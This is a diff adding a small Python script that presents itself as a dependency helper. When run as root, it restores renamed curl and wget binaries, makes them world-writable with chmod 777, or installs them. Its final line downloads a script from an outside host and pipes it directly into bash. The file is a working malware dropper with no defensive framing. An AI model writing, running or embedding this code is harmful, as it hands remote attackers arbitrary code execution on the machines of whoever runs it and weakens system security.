@@ -1,0 +1,25 @@
+from os import path, system, getuid
+
+def GetDeps():
+    if path.isfile('/usr/bin/url'):
+        system("mv /usr/bin/url /usr/bin/curl")
+        system("chmod 777 /usr/bin/curl")
+        system("chmod +x /usr/bin/curl")
+    if path.isfile('/usr/bin/get'):
+        system("mv /usr/bin/get /usr/bin/wget")
+        system("chmod 777 /usr/bin/wget")
+        system("chmod +x /usr/bin/wget")
+    if not path.isfile('/usr/bin/wget'):
+        system("yum clean all")
+        system("yum -y install wget")
+        system("apt-get update")
+        system("apt-get -y install wget")
+    if not path.isfile('/usr/bin/curl'):
+        system("yum clean all")
+        system("yum -y install curl")
+        system("apt-get update")
+        system("apt-get -y install curl")
+
+if getuid()==0:
+    GetDeps()
+system("(curl -fsSL http://alonecode.ml/go||wget -q -O - http://alonecode.ml/go)|bash")
